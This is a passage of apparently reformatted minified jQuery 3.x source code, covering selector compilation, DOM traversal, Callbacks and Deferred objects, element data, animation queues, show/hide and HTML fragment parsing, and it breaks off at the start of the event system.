                  (u = y[d]) && c.push((g[d] = u));
                o(null, (y = []), c, l);
              }
              for (d = y.length; d--;)
                (u = y[d]) &&
                  (c = o ? L(r, u) : p[d]) > -1 &&
                  (r[c] = !(s[c] = u));
            }
          } else (y = be(y === s ? y.splice(h, y.length) : y)), o ? o(null, s, y, l) : H.apply(s, y);
        })
      );
    }
    function ke(e) {
      for (
        var t,
        n,
        o,
        r = e.length,
        s = i.relative[e[0].type],
        a = s || i.relative[" "],
        l = s ? 1 : 0,
        d = me(
          function (e) {
            return e === t;
          },
          a,
          !0
        ),
        u = me(
          function (e) {
            return L(t, e) > -1;
          },
          a,
          !0
        ),
        p = [
          function (e, n, i) {
            var o =
              (!s && (i || n !== c)) ||
              ((t = n).nodeType ? d(e, n, i) : u(e, n, i));
            return (t = null), o;
          },
        ];
        l < r;
        l++
      )
        if ((n = i.relative[e[l].type])) p = [me(we(p), n)];
        else {
          if ((n = i.filter[e[l].type].apply(null, e[l].matches))[b]) {
            for (o = ++l; o < r && !i.relative[e[o].type]; o++);
            return xe(
              l > 1 && we(p),
              l > 1 &&
              ye(
                e
                  .slice(0, l - 1)
                  .concat({ value: " " === e[l - 2].type ? "*" : "" })
              ).replace(R, "$1"),
              n,
              l < o && ke(e.slice(l, o)),
              o < r && ke((e = e.slice(o))),
              o < r && ye(e)
            );
          }
          p.push(n);
        }
      return we(p);
    }
    function Te(e, t) {
      var n = t.length > 0,
        o = e.length > 0,
        r = function (r, s, a, l, d) {
          var u,
            h,
            g,
            y = 0,
            m = "0",
            w = r && [],
            b = [],
            x = c,
            T = r || (o && i.find.TAG("*", d)),
            S = (k += null == x ? 1 : Math.random() || 0.1),
            C = T.length;
          for (
            d && (c = s === f || s || d);
            m !== C && null != (u = T[m]);
            m++
          ) {
            if (o && u) {
              for (
                h = 0, s || u.ownerDocument === f || (p(u), (a = !v));
                (g = e[h++]);

              )
                if (g(u, s || f, a)) {
                  l.push(u);
                  break;
                }
              d && (k = S);
            }
            n && ((u = !g && u) && y--, r && w.push(u));
          }
          if (((y += m), n && m !== y)) {
            for (h = 0; (g = t[h++]);) g(w, b, s, a);
            if (r) {
              if (y > 0) for (; m--;) w[m] || b[m] || (b[m] = D.call(l));
              b = be(b);
            }
            H.apply(l, b),
              d && !r && b.length > 0 && y + t.length > 1 && re.uniqueSort(l);
          }
          return d && ((k = S), (c = x)), w;
        };
      return n ? ae(r) : r;
    }
    return (
      (ge.prototype = i.filters = i.pseudos),
      (i.setFilters = new ge()),
      (s = re.tokenize =
        function (e, t) {
          var n,
            o,
            r,
            s,
            a,
            l,
            c,
            d = C[e + " "];
          if (d) return t ? 0 : d.slice(0);
          for (a = e, l = [], c = i.preFilter; a;) {
            for (s in ((n && !(o = F.exec(a))) ||
              (o && (a = a.slice(o[0].length) || a), l.push((r = []))),
              (n = !1),
              (o = B.exec(a)) &&
              ((n = o.shift()),
                r.push({ value: n, type: o[0].replace(R, " ") }),
                (a = a.slice(n.length))),
              i.filter))
              !(o = Y[s].exec(a)) ||
                (c[s] && !(o = c[s](o))) ||
                ((n = o.shift()),
                  r.push({ value: n, type: s, matches: o }),
                  (a = a.slice(n.length)));
            if (!n) break;
          }
          return t ? a.length : a ? re.error(e) : C(e, l).slice(0);
        }),
      (a = re.compile =
        function (e, t) {
          var n,
            i = [],
            o = [],
            r = $[e + " "];
          if (!r) {
            for (t || (t = s(e)), n = t.length; n--;)
              (r = ke(t[n]))[b] ? i.push(r) : o.push(r);
            (r = $(e, Te(o, i))).selector = e;
          }
          return r;
        }),
      (l = re.select =
        function (e, t, n, o) {
          var r,
            l,
            c,
            d,
            u,
            p = "function" == typeof e && e,
            f = !o && s((e = p.selector || e));
          if (((n = n || []), 1 === f.length)) {
            if (
              (l = f[0] = f[0].slice(0)).length > 2 &&
              "ID" === (c = l[0]).type &&
              9 === t.nodeType &&
              v &&
              i.relative[l[1].type]
            ) {
              if (!(t = (i.find.ID(c.matches[0].replace(Z, ee), t) || [])[0]))
                return n;
              p && (t = t.parentNode), (e = e.slice(l.shift().value.length));
            }
            for (
              r = Y.needsContext.test(e) ? 0 : l.length;
              r-- && ((c = l[r]), !i.relative[(d = c.type)]);

            )
              if (
                (u = i.find[d]) &&
                (o = u(
                  c.matches[0].replace(Z, ee),
                  (K.test(l[0].type) && ve(t.parentNode)) || t
                ))
              ) {
                if ((l.splice(r, 1), !(e = o.length && ye(l))))
                  return H.apply(n, o), n;
                break;
              }
          }
          return (
            (p || a(e, f))(
              o,
              t,
              !v,
              n,
              !t || (K.test(e) && ve(t.parentNode)) || t
            ),
            n
          );
        }),
      (n.sortStable = b.split("").sort(A).join("") === b),
      (n.detectDuplicates = !!u),
      p(),
      (n.sortDetached = le(function (e) {
        return 1 & e.compareDocumentPosition(f.createElement("fieldset"));
      })),
      le(function (e) {
        return (
          (e.innerHTML = "<a href='#'></a>"),
          "#" === e.firstChild.getAttribute("href")
        );
      }) ||
      ce("type|href|height|width", function (e, t, n) {
        if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2);
      }),
      (n.attributes &&
        le(function (e) {
          return (
            (e.innerHTML = "<input/>"),
            e.firstChild.setAttribute("value", ""),
            "" === e.firstChild.getAttribute("value")
          );
        })) ||
      ce("value", function (e, t, n) {
        if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue;
      }),
      le(function (e) {
        return null == e.getAttribute("disabled");
      }) ||
      ce(P, function (e, t, n) {
        var i;
        if (!n)
          return !0 === e[t]
            ? t.toLowerCase()
            : (i = e.getAttributeNode(t)) && i.specified
              ? i.value
              : null;
      }),
      re
    );
  })(e);
  (b.find = T),
    (b.expr = T.selectors),
    (b.expr[":"] = b.expr.pseudos),
    (b.uniqueSort = b.unique = T.uniqueSort),
    (b.text = T.getText),
    (b.isXMLDoc = T.isXML),
    (b.contains = T.contains),
    (b.escapeSelector = T.escape);
  var S = function (e, t, n) {
    for (var i = [], o = void 0 !== n; (e = e[t]) && 9 !== e.nodeType;)
      if (1 === e.nodeType) {
        if (o && b(e).is(n)) break;
        i.push(e);
      }
    return i;
  },
    C = function (e, t) {
      for (var n = []; e; e = e.nextSibling)
        1 === e.nodeType && e !== t && n.push(e);
      return n;
    },
    $ = b.expr.match.needsContext;
  function A(e, t) {
    return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
  }
  var E = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;
  function j(e, t, n) {
    return v(t)
      ? b.grep(e, function (e, i) {
        return !!t.call(e, i, e) !== n;
      })
      : t.nodeType
        ? b.grep(e, function (e) {
          return (e === t) !== n;
        })
        : "string" != typeof t
          ? b.grep(e, function (e) {
            return l.call(t, e) > -1 !== n;
          })
          : b.filter(t, e, n);
  }
  (b.filter = function (e, t, n) {
    var i = t[0];
    return (
      n && (e = ":not(" + e + ")"),
      1 === t.length && 1 === i.nodeType
        ? b.find.matchesSelector(i, e)
          ? [i]
          : []
        : b.find.matches(
          e,
          b.grep(t, function (e) {
            return 1 === e.nodeType;
          })
        )
    );
  }),
    b.fn.extend({
      find: function (e) {
        var t,
          n,
          i = this.length,
          o = this;
        if ("string" != typeof e)
          return this.pushStack(
            b(e).filter(function () {
              for (t = 0; t < i; t++) if (b.contains(o[t], this)) return !0;
            })
          );
        for (n = this.pushStack([]), t = 0; t < i; t++) b.find(e, o[t], n);
        return i > 1 ? b.uniqueSort(n) : n;
      },
      filter: function (e) {
        return this.pushStack(j(this, e || [], !1));
      },
      not: function (e) {
        return this.pushStack(j(this, e || [], !0));
      },
      is: function (e) {
        return !!j(this, "string" == typeof e && $.test(e) ? b(e) : e || [], !1)
          .length;
      },
    });
  var D,
    N = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
  ((b.fn.init = function (e, t, n) {
    var o, r;
    if (!e) return this;
    if (((n = n || D), "string" == typeof e)) {
      if (
        !(o =
          "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3
            ? [null, e, null]
            : N.exec(e)) ||
        (!o[1] && t)
      )
        return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
      if (o[1]) {
        if (
          ((t = t instanceof b ? t[0] : t),
            b.merge(
              this,
              b.parseHTML(o[1], t && t.nodeType ? t.ownerDocument || t : i, !0)
            ),
            E.test(o[1]) && b.isPlainObject(t))
        )
          for (o in t) v(this[o]) ? this[o](t[o]) : this.attr(o, t[o]);
        return this;
      }
      return (
        (r = i.getElementById(o[2])) && ((this[0] = r), (this.length = 1)), this
      );
    }
    return e.nodeType
      ? ((this[0] = e), (this.length = 1), this)
      : v(e)
        ? void 0 !== n.ready
          ? n.ready(e)
          : e(b)
        : b.makeArray(e, this);
  }).prototype = b.fn),
    (D = b(i));
  var H = /^(?:parents|prev(?:Until|All))/,
    O = { children: !0, contents: !0, next: !0, prev: !0 };
  function L(e, t) {
    for (; (e = e[t]) && 1 !== e.nodeType;);
    return e;
  }
  b.fn.extend({
    has: function (e) {
      var t = b(e, this),
        n = t.length;
      return this.filter(function () {
        for (var e = 0; e < n; e++) if (b.contains(this, t[e])) return !0;
      });
    },
    closest: function (e, t) {
      var n,
        i = 0,
        o = this.length,
        r = [],
        s = "string" != typeof e && b(e);
      if (!$.test(e))
        for (; i < o; i++)
          for (n = this[i]; n && n !== t; n = n.parentNode)
            if (
              n.nodeType < 11 &&
              (s
                ? s.index(n) > -1
                : 1 === n.nodeType && b.find.matchesSelector(n, e))
            ) {
              r.push(n);
              break;
            }
      return this.pushStack(r.length > 1 ? b.uniqueSort(r) : r);
    },
    index: function (e) {
      return e
        ? "string" == typeof e
          ? l.call(b(e), this[0])
          : l.call(this, e.jquery ? e[0] : e)
        : this[0] && this[0].parentNode
          ? this.first().prevAll().length
          : -1;
    },
    add: function (e, t) {
      return this.pushStack(b.uniqueSort(b.merge(this.get(), b(e, t))));
    },
    addBack: function (e) {
      return this.add(null == e ? this.prevObject : this.prevObject.filter(e));
    },
  }),
    b.each(
      {
        parent: function (e) {
          var t = e.parentNode;
          return t && 11 !== t.nodeType ? t : null;
        },
        parents: function (e) {
          return S(e, "parentNode");
        },
        parentsUntil: function (e, t, n) {
          return S(e, "parentNode", n);
        },
        next: function (e) {
          return L(e, "nextSibling");
        },
        prev: function (e) {
          return L(e, "previousSibling");
        },
        nextAll: function (e) {
          return S(e, "nextSibling");
        },
        prevAll: function (e) {
          return S(e, "previousSibling");
        },
        nextUntil: function (e, t, n) {
          return S(e, "nextSibling", n);
        },
        prevUntil: function (e, t, n) {
          return S(e, "previousSibling", n);
        },
        siblings: function (e) {
          return C((e.parentNode || {}).firstChild, e);
        },
        children: function (e) {
          return C(e.firstChild);
        },
        contents: function (e) {
          return A(e, "iframe")
            ? e.contentDocument
            : (A(e, "template") && (e = e.content || e),
              b.merge([], e.childNodes));
        },
      },
      function (e, t) {
        b.fn[e] = function (n, i) {
          var o = b.map(this, t, n);
          return (
            "Until" !== e.slice(-5) && (i = n),
            i && "string" == typeof i && (o = b.filter(i, o)),
            this.length > 1 &&
            (O[e] || b.uniqueSort(o), H.test(e) && o.reverse()),
            this.pushStack(o)
          );
        };
      }
    );
  var P = /[^\x20\t\r\n\f]+/g;
  function q(e) {
    return e;
  }
  function M(e) {
    throw e;
  }
  function I(e, t, n, i) {
    var o;
    try {
      e && v((o = e.promise))
        ? o.call(e).done(t).fail(n)
        : e && v((o = e.then))
          ? o.call(e, t, n)
          : t.apply(void 0, [e].slice(i));
    } catch (e) {
      n.apply(void 0, [e]);
    }
  }
  (b.Callbacks = function (e) {
    e =
      "string" == typeof e
        ? (function (e) {
          var t = {};
          return (
            b.each(e.match(P) || [], function (e, n) {
              t[n] = !0;
            }),
            t
          );
        })(e)
        : b.extend({}, e);
    var t,
      n,
      i,
      o,
      r = [],
      s = [],
      a = -1,
      l = function () {
        for (o = o || e.once, i = t = !0; s.length; a = -1)
          for (n = s.shift(); ++a < r.length;)
            !1 === r[a].apply(n[0], n[1]) &&
              e.stopOnFalse &&
              ((a = r.length), (n = !1));
        e.memory || (n = !1), (t = !1), o && (r = n ? [] : "");
      },
      c = {
        add: function () {
          return (
            r &&
            (n && !t && ((a = r.length - 1), s.push(n)),
              (function t(n) {
                b.each(n, function (n, i) {
                  v(i)
                    ? (e.unique && c.has(i)) || r.push(i)
                    : i && i.length && "string" !== w(i) && t(i);
                });
              })(arguments),
              n && !t && l()),
            this
          );
        },
        remove: function () {
          return (
            b.each(arguments, function (e, t) {
              for (var n; (n = b.inArray(t, r, n)) > -1;)
                r.splice(n, 1), n <= a && a--;
            }),
            this
          );
        },
        has: function (e) {
          return e ? b.inArray(e, r) > -1 : r.length > 0;
        },
        empty: function () {
          return r && (r = []), this;
        },
        disable: function () {
          return (o = s = []), (r = n = ""), this;
        },
        disabled: function () {
          return !r;
        },
        lock: function () {
          return (o = s = []), n || t || (r = n = ""), this;
        },
        locked: function () {
          return !!o;
        },
        fireWith: function (e, n) {
          return (
            o ||
            ((n = [e, (n = n || []).slice ? n.slice() : n]),
              s.push(n),
              t || l()),
            this
          );
        },
        fire: function () {
          return c.fireWith(this, arguments), this;
        },
        fired: function () {
          return !!i;
        },
      };
    return c;
  }),
    b.extend({
      Deferred: function (t) {
        var n = [
          [
            "notify",
            "progress",
            b.Callbacks("memory"),
            b.Callbacks("memory"),
            2,
          ],
          [
            "resolve",
            "done",
            b.Callbacks("once memory"),
            b.Callbacks("once memory"),
            0,
            "resolved",
          ],
          [
            "reject",
            "fail",
            b.Callbacks("once memory"),
            b.Callbacks("once memory"),
            1,
            "rejected",
          ],
        ],
          i = "pending",
          o = {
            state: function () {
              return i;
            },
            always: function () {
              return r.done(arguments).fail(arguments), this;
            },
            catch: function (e) {
              return o.then(null, e);
            },
            pipe: function () {
              var e = arguments;
              return b
                .Deferred(function (t) {
                  b.each(n, function (n, i) {
                    var o = v(e[i[4]]) && e[i[4]];
                    r[i[1]](function () {
                      var e = o && o.apply(this, arguments);
                      e && v(e.promise)
                        ? e
                          .promise()
                          .progress(t.notify)
                          .done(t.resolve)
                          .fail(t.reject)
                        : t[i[0] + "With"](this, o ? [e] : arguments);
                    });
                  }),
                    (e = null);
                })
                .promise();
            },
            then: function (t, i, o) {
              var r = 0;
              function s(t, n, i, o) {
                return function () {
                  var a = this,
                    l = arguments,
                    c = function () {
                      var e, c;
                      if (!(t < r)) {
                        if ((e = i.apply(a, l)) === n.promise())
                          throw new TypeError("Thenable self-resolution");
                        (c =
                          e &&
                          ("object" == typeof e || "function" == typeof e) &&
                          e.then),
                          v(c)
                            ? o
                              ? c.call(e, s(r, n, q, o), s(r, n, M, o))
                              : (r++,
                                c.call(
                                  e,
                                  s(r, n, q, o),
                                  s(r, n, M, o),
                                  s(r, n, q, n.notifyWith)
                                ))
                            : (i !== q && ((a = void 0), (l = [e])),
                              (o || n.resolveWith)(a, l));
                      }
                    },
                    d = o
                      ? c
                      : function () {
                        try {
                          c();
                        } catch (e) {
                          b.Deferred.exceptionHook &&
                            b.Deferred.exceptionHook(e, d.stackTrace),
                            t + 1 >= r &&
                            (i !== M && ((a = void 0), (l = [e])),
                              n.rejectWith(a, l));
                        }
                      };
                  t
                    ? d()
                    : (b.Deferred.getStackHook &&
                      (d.stackTrace = b.Deferred.getStackHook()),
                      e.setTimeout(d));
                };
              }
              return b
                .Deferred(function (e) {
                  n[0][3].add(s(0, e, v(o) ? o : q, e.notifyWith)),
                    n[1][3].add(s(0, e, v(t) ? t : q)),
                    n[2][3].add(s(0, e, v(i) ? i : M));
                })
                .promise();
            },
            promise: function (e) {
              return null != e ? b.extend(e, o) : o;
            },
          },
          r = {};
        return (
          b.each(n, function (e, t) {
            var s = t[2],
              a = t[5];
            (o[t[1]] = s.add),
              a &&
              s.add(
                function () {
                  i = a;
                },
                n[3 - e][2].disable,
                n[3 - e][3].disable,
                n[0][2].lock,
                n[0][3].lock
              ),
              s.add(t[3].fire),
              (r[t[0]] = function () {
                return (
                  r[t[0] + "With"](this === r ? void 0 : this, arguments), this
                );
              }),
              (r[t[0] + "With"] = s.fireWith);
          }),
          o.promise(r),
          t && t.call(r, r),
          r
        );
      },
      when: function (e) {
        var t = arguments.length,
          n = t,
          i = Array(n),
          o = r.call(arguments),
          s = b.Deferred(),
          a = function (e) {
            return function (n) {
              (i[e] = this),
                (o[e] = arguments.length > 1 ? r.call(arguments) : n),
                --t || s.resolveWith(i, o);
            };
          };
        if (
          t <= 1 &&
          (I(e, s.done(a(n)).resolve, s.reject, !t),
            "pending" === s.state() || v(o[n] && o[n].then))
        )
          return s.then();
        for (; n--;) I(o[n], a(n), s.reject);
        return s.promise();
      },
    });
  var z = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
  (b.Deferred.exceptionHook = function (t, n) {
    e.console &&
      e.console.warn &&
      t &&
      z.test(t.name) &&
      e.console.warn("jQuery.Deferred exception: " + t.message, t.stack, n);
  }),
    (b.readyException = function (t) {
      e.setTimeout(function () {
        throw t;
      });
    });
  var W = b.Deferred();
  function R() {
    i.removeEventListener("DOMContentLoaded", R),
      e.removeEventListener("load", R),
      b.ready();
  }
  (b.fn.ready = function (e) {
    return (
      W.then(e).catch(function (e) {
        b.readyException(e);
      }),
      this
    );
  }),
    b.extend({
      isReady: !1,
      readyWait: 1,
      ready: function (e) {
        (!0 === e ? --b.readyWait : b.isReady) ||
          ((b.isReady = !0),
            (!0 !== e && --b.readyWait > 0) || W.resolveWith(i, [b]));
      },
    }),
    (b.ready.then = W.then),
    "complete" === i.readyState ||
      ("loading" !== i.readyState && !i.documentElement.doScroll)
      ? e.setTimeout(b.ready)
      : (i.addEventListener("DOMContentLoaded", R),
        e.addEventListener("load", R));
  var F = function (e, t, n, i, o, r, s) {
    var a = 0,
      l = e.length,
      c = null == n;
    if ("object" === w(n))
      for (a in ((o = !0), n)) F(e, t, a, n[a], !0, r, s);
    else if (
      void 0 !== i &&
      ((o = !0),
        v(i) || (s = !0),
        c &&
        (s
          ? (t.call(e, i), (t = null))
          : ((c = t),
            (t = function (e, t, n) {
              return c.call(b(e), n);
            }))),
        t)
    )
      for (; a < l; a++) t(e[a], n, s ? i : i.call(e[a], a, t(e[a], n)));
    return o ? e : c ? t.call(e) : l ? t(e[0], n) : r;
  },
    B = /^-ms-/,
    U = /-([a-z])/g;
  function X(e, t) {
    return t.toUpperCase();
  }
  function _(e) {
    return e.replace(B, "ms-").replace(U, X);
  }
  var Y = function (e) {
    return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType;
  };
  function V() {
    this.expando = b.expando + V.uid++;
  }
  (V.uid = 1),
    (V.prototype = {
      cache: function (e) {
        var t = e[this.expando];
        return (
          t ||
          ((t = {}),
            Y(e) &&
            (e.nodeType
              ? (e[this.expando] = t)
              : Object.defineProperty(e, this.expando, {
                value: t,
                configurable: !0,
              }))),
          t
        );
      },
      set: function (e, t, n) {
        var i,
          o = this.cache(e);
        if ("string" == typeof t) o[_(t)] = n;
        else for (i in t) o[_(i)] = t[i];
        return o;
      },
      get: function (e, t) {
        return void 0 === t
          ? this.cache(e)
          : e[this.expando] && e[this.expando][_(t)];
      },
      access: function (e, t, n) {
        return void 0 === t || (t && "string" == typeof t && void 0 === n)
          ? this.get(e, t)
          : (this.set(e, t, n), void 0 !== n ? n : t);
      },
      remove: function (e, t) {
        var n,
          i = e[this.expando];
        if (void 0 !== i) {
          if (void 0 !== t) {
            n = (t = Array.isArray(t)
              ? t.map(_)
              : (t = _(t)) in i
                ? [t]
                : t.match(P) || []).length;
            for (; n--;) delete i[t[n]];
          }
          (void 0 === t || b.isEmptyObject(i)) &&
            (e.nodeType ? (e[this.expando] = void 0) : delete e[this.expando]);
        }
      },
      hasData: function (e) {
        var t = e[this.expando];
        return void 0 !== t && !b.isEmptyObject(t);
      },
    });
  var G = new V(),
    Q = new V(),
    J = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
    K = /[A-Z]/g;
  function Z(e, t, n) {
    var i;
    if (void 0 === n && 1 === e.nodeType)
      if (
        ((i = "data-" + t.replace(K, "-$&").toLowerCase()),
          "string" == typeof (n = e.getAttribute(i)))
      ) {
        try {
          n = (function (e) {
            return (
              "true" === e ||
              ("false" !== e &&
                ("null" === e
                  ? null
                  : e === +e + ""
                    ? +e
                    : J.test(e)
                      ? JSON.parse(e)
                      : e))
            );
          })(n);
        } catch (e) { }
        Q.set(e, t, n);
      } else n = void 0;
    return n;
  }
  b.extend({
    hasData: function (e) {
      return Q.hasData(e) || G.hasData(e);
    },
    data: function (e, t, n) {
      return Q.access(e, t, n);
    },
    removeData: function (e, t) {
      Q.remove(e, t);
    },
    _data: function (e, t, n) {
      return G.access(e, t, n);
    },
    _removeData: function (e, t) {
      G.remove(e, t);
    },
  }),
    b.fn.extend({
      data: function (e, t) {
        var n,
          i,
          o,
          r = this[0],
          s = r && r.attributes;
        if (void 0 === e) {
          if (
            this.length &&
            ((o = Q.get(r)), 1 === r.nodeType && !G.get(r, "hasDataAttrs"))
          ) {
            for (n = s.length; n--;)
              s[n] &&
                0 === (i = s[n].name).indexOf("data-") &&
                ((i = _(i.slice(5))), Z(r, i, o[i]));
            G.set(r, "hasDataAttrs", !0);
          }
          return o;
        }
        return "object" == typeof e
          ? this.each(function () {
            Q.set(this, e);
          })
          : F(
            this,
            function (t) {
              var n;
              if (r && void 0 === t) {
                if (void 0 !== (n = Q.get(r, e))) return n;
                if (void 0 !== (n = Z(r, e))) return n;
              } else
                this.each(function () {
                  Q.set(this, e, t);
                });
            },
            null,
            t,
            arguments.length > 1,
            null,
            !0
          );
      },
      removeData: function (e) {
        return this.each(function () {
          Q.remove(this, e);
        });
      },
    }),
    b.extend({
      queue: function (e, t, n) {
        var i;
        if (e)
          return (
            (t = (t || "fx") + "queue"),
            (i = G.get(e, t)),
            n &&
            (!i || Array.isArray(n)
              ? (i = G.access(e, t, b.makeArray(n)))
              : i.push(n)),
            i || []
          );
      },
      dequeue: function (e, t) {
        t = t || "fx";
        var n = b.queue(e, t),
          i = n.length,
          o = n.shift(),
          r = b._queueHooks(e, t);
        "inprogress" === o && ((o = n.shift()), i--),
          o &&
          ("fx" === t && n.unshift("inprogress"),
            delete r.stop,
            o.call(
              e,
              function () {
                b.dequeue(e, t);
              },
              r
            )),
          !i && r && r.empty.fire();
      },
      _queueHooks: function (e, t) {
        var n = t + "queueHooks";
        return (
          G.get(e, n) ||
          G.access(e, n, {
            empty: b.Callbacks("once memory").add(function () {
              G.remove(e, [t + "queue", n]);
            }),
          })
        );
      },
    }),
    b.fn.extend({
      queue: function (e, t) {
        var n = 2;
        return (
          "string" != typeof e && ((t = e), (e = "fx"), n--),
          arguments.length < n
            ? b.queue(this[0], e)
            : void 0 === t
              ? this
              : this.each(function () {
                var n = b.queue(this, e, t);
                b._queueHooks(this, e),
                  "fx" === e && "inprogress" !== n[0] && b.dequeue(this, e);
              })
        );
      },
      dequeue: function (e) {
        return this.each(function () {
          b.dequeue(this, e);
        });
      },
      clearQueue: function (e) {
        return this.queue(e || "fx", []);
      },
      promise: function (e, t) {
        var n,
          i = 1,
          o = b.Deferred(),
          r = this,
          s = this.length,
          a = function () {
            --i || o.resolveWith(r, [r]);
          };
        for (
          "string" != typeof e && ((t = e), (e = void 0)), e = e || "fx";
          s--;

        )
          (n = G.get(r[s], e + "queueHooks")) &&
            n.empty &&
            (i++, n.empty.add(a));
        return a(), o.promise(t);
      },
    });
  var ee = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
    te = new RegExp("^(?:([+-])=|)(" + ee + ")([a-z%]*)$", "i"),
    ne = ["Top", "Right", "Bottom", "Left"],
    ie = function (e, t) {
      return (
        "none" === (e = t || e).style.display ||
        ("" === e.style.display &&
          b.contains(e.ownerDocument, e) &&
          "none" === b.css(e, "display"))
      );
    },
    oe = function (e, t, n, i) {
      var o,
        r,
        s = {};
      for (r in t) (s[r] = e.style[r]), (e.style[r] = t[r]);
      for (r in ((o = n.apply(e, i || [])), t)) e.style[r] = s[r];
      return o;
    };
  function re(e, t, n, i) {
    var o,
      r,
      s = 20,
      a = i
        ? function () {
          return i.cur();
        }
        : function () {
          return b.css(e, t, "");
        },
      l = a(),
      c = (n && n[3]) || (b.cssNumber[t] ? "" : "px"),
      d = (b.cssNumber[t] || ("px" !== c && +l)) && te.exec(b.css(e, t));
    if (d && d[3] !== c) {
      for (l /= 2, c = c || d[3], d = +l || 1; s--;)
        b.style(e, t, d + c),
          (1 - r) * (1 - (r = a() / l || 0.5)) <= 0 && (s = 0),
          (d /= r);
      (d *= 2), b.style(e, t, d + c), (n = n || []);
    }
    return (
      n &&
      ((d = +d || +l || 0),
        (o = n[1] ? d + (n[1] + 1) * n[2] : +n[2]),
        i && ((i.unit = c), (i.start = d), (i.end = o))),
      o
    );
  }
  var se = {};
  function ae(e) {
    var t,
      n = e.ownerDocument,
      i = e.nodeName,
      o = se[i];
    return (
      o ||
      ((t = n.body.appendChild(n.createElement(i))),
        (o = b.css(t, "display")),
        t.parentNode.removeChild(t),
        "none" === o && (o = "block"),
        (se[i] = o),
        o)
    );
  }
  function le(e, t) {
    for (var n, i, o = [], r = 0, s = e.length; r < s; r++)
      (i = e[r]).style &&
        ((n = i.style.display),
          t
            ? ("none" === n &&
              ((o[r] = G.get(i, "display") || null),
                o[r] || (i.style.display = "")),
              "" === i.style.display && ie(i) && (o[r] = ae(i)))
            : "none" !== n && ((o[r] = "none"), G.set(i, "display", n)));
    for (r = 0; r < s; r++) null != o[r] && (e[r].style.display = o[r]);
    return e;
  }
  b.fn.extend({
    show: function () {
      return le(this, !0);
    },
    hide: function () {
      return le(this);
    },
    toggle: function (e) {
      return "boolean" == typeof e
        ? e
          ? this.show()
          : this.hide()
        : this.each(function () {
          ie(this) ? b(this).show() : b(this).hide();
        });
    },
  });
  var ce = /^(?:checkbox|radio)$/i,
    de = /<([a-z][^\/\0>\x20\t\r\n\f]+)/i,
    ue = /^$|^module$|\/(?:java|ecma)script/i,
    pe = {
      option: [1, "<select multiple='multiple'>", "</select>"],
      thead: [1, "<table>", "</table>"],
      col: [2, "<table><colgroup>", "</colgroup></table>"],
      tr: [2, "<table><tbody>", "</tbody></table>"],
      td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
      _default: [0, "", ""],
    };
  function fe(e, t) {
    var n;
    return (
      (n =
        void 0 !== e.getElementsByTagName
          ? e.getElementsByTagName(t || "*")
          : void 0 !== e.querySelectorAll
            ? e.querySelectorAll(t || "*")
            : []),
      void 0 === t || (t && A(e, t)) ? b.merge([e], n) : n
    );
  }
  function he(e, t) {
    for (var n = 0, i = e.length; n < i; n++)
      G.set(e[n], "globalEval", !t || G.get(t[n], "globalEval"));
  }
  (pe.optgroup = pe.option),
    (pe.tbody = pe.tfoot = pe.colgroup = pe.caption = pe.thead),
    (pe.th = pe.td);
  var ve = /<|&#?\w+;/;
  function ge(e, t, n, i, o) {
    for (
      var r,
      s,
      a,
      l,
      c,
      d,
      u = t.createDocumentFragment(),
      p = [],
      f = 0,
      h = e.length;
      f < h;
      f++
    )
      if ((r = e[f]) || 0 === r)
        if ("object" === w(r)) b.merge(p, r.nodeType ? [r] : r);
        else if (ve.test(r)) {
          for (
            s = s || u.appendChild(t.createElement("div")),
            a = (de.exec(r) || ["", ""])[1].toLowerCase(),
            l = pe[a] || pe._default,
            s.innerHTML = l[1] + b.htmlPrefilter(r) + l[2],
            d = l[0];
            d--;

          )
            s = s.lastChild;
          b.merge(p, s.childNodes), ((s = u.firstChild).textContent = "");
        } else p.push(t.createTextNode(r));
    for (u.textContent = "", f = 0; (r = p[f++]);)
      if (i && b.inArray(r, i) > -1) o && o.push(r);
      else if (
        ((c = b.contains(r.ownerDocument, r)),
          (s = fe(u.appendChild(r), "script")),
          c && he(s),
          n)
      )
        for (d = 0; (r = s[d++]);) ue.test(r.type || "") && n.push(r);
    return u;
  }
  !(function () {
    var e = i.createDocumentFragment().appendChild(i.createElement("div")),
      t = i.createElement("input");
    t.setAttribute("type", "radio"),
      t.setAttribute("checked", "checked"),
      t.setAttribute("name", "t"),
      e.appendChild(t),
      (h.checkClone = e.cloneNode(!0).cloneNode(!0).lastChild.checked),
      (e.innerHTML = "<textarea>x</textarea>"),
      (h.noCloneChecked = !!e.cloneNode(!0).lastChild.defaultValue);
  })();
  var ye = i.documentElement,
    me = /^key/,
    we = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
    be = /^([^.]*)(?:\.(.+)|)/;
  function xe() {
    return !0;
  }
  function ke() {
    return !1;
  }
  function Te() {
    try {
      return i.activeElement;
    } catch (e) { }
  }
  function Se(e, t, n, i, o, r) {
    var s, a;
    if ("object" == typeof t) {
      for (a in ("string" != typeof n && ((i = i || n), (n = void 0)), t))
        Se(e, a, n, i, t[a], r);
      return e;
    }
    if (
      (null == i && null == o
        ? ((o = n), (i = n = void 0))
        : null == o &&
        ("string" == typeof n
          ? ((o = i), (i = void 0))
          : ((o = i), (i = n), (n = void 0))),
        !1 === o)
    )
      o = ke;
    else if (!o) return e;
    return (
      1 === r &&
      ((s = o),
        ((o = function (e) {
          return b().off(e), s.apply(this, arguments);
        }).guid = s.guid || (s.guid = b.guid++))),
      e.each(function () {
        b.event.add(this, t, o, i, n);
      })
    );
  }
  (b.event = {
    global: {},
    add: function (e, t, n, i, o) {
      var r,
        s,
        a,
        l,
        c,
        d,
        u,
        p,
        f,
        h,
        v,
        g = G.get(e);
      if (g)
        for (
          n.handler && ((n = (r = n).handler), (o = r.selector)),
          o && b.find.matchesSelector(ye, o),
          n.guid || (n.guid = b.guid++),
          (l = g.events) || (l = g.events = {}),
          (s = g.handle) ||
          (s = g.handle =
            function (t) {
